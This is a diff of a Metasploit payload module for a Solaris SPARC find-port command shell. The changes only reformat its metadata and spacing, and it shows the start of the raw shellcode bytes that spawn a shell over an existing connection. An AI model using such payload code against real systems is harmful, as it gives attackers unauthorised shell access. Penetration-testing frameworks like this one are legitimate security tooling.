@@ -3,9 +3,7 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 module MetasploitModule
-
   CachedSize = 136
 
   include Msf::Payload::Single
@@ -13,19 +11,23 @@ module MetasploitModule
   include Msf::Sessions::CommandShellOptions
 
   def initialize(info = {})
-    super(merge_info(info,
-      'Name'          => 'Solaris Command Shell, Find Port Inline',
-      'Description'   => 'Spawn a shell on an established connection',
-      'Author'        => 'vlad902',
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'solaris',
-      'Arch'          => ARCH_SPARC,
-      'Handler'       => Msf::Handler::FindPort,
-      'Session'       => Msf::Sessions::CommandShell))
+    super(
+      merge_info(
+        info,
+        'Name' => 'Solaris Command Shell, Find Port Inline',
+        'Description' => 'Spawn a shell on an established connection',
+        'Author' => 'vlad902',
+        'License' => MSF_LICENSE,
+        'Platform' => 'solaris',
+        'Arch' => ARCH_SPARC,
+        'Handler' => Msf::Handler::FindPort,
+        'Session' => Msf::Sessions::CommandShell
+      )
+    )
   end
 
   def generate
-    port    = (datastore['CPORT'] || '0').to_i
+    port = (datastore['CPORT'] || '0').to_i
     payload =
       Rex::Arch::Sparc.set(port, "l6") +
       "\x9c\x2b\xa0\x07\x90\x1a\x80\x0a\xd0\x23\xbf\xe8\x90\x02\x20\x01" +
